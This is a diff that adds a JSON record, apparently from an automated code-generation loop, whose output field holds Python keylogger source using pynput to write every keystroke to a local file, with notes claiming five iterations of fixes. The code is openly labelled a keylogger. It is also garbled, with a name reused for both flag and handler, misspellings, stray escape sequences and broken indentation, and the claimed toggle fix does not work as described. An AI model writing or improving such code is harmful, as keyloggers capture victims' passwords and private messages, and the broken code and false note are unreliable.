@@ -1,0 +1,10 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\nimport os\n\non_press = True\n\ndef on_press(key):\n    global on_press\n    if not on_press: return None\\n        \none_press=False\n    try:\n        script_dir = os.path.dirname(__file__)\n        log_file = os.path.join(script_dir, 'keylogs.txt')\n        with open(log_file, 'a') as log:\n            if hasattr(key, 'char'):\n                log.write(str(key.char))\n            else:\n                log.write(str(key))\n    except AttributeError:\n        pass\\n    finally:\\n       one_press=True\\n///\\n\ndef main():\n   print(\"Keylogger Started!\")\n   with keyboard.Listener(on_press=on_press) as listener:\n            try:\n                listener.join()\n            except KeyboardInterrupt:\n                pass\nif __name__ == '__main__': \n    main()",
+  "notes": "Added code to ensure the keylogger runs only once by using a toggle variable 'on_press'.",
+  "applied_fixes": [
+    "iteration4_issue1",
+    "iteration4_issue2",
+    "iteration5_antirace"
+  ],
+  "iterations": 5
+}
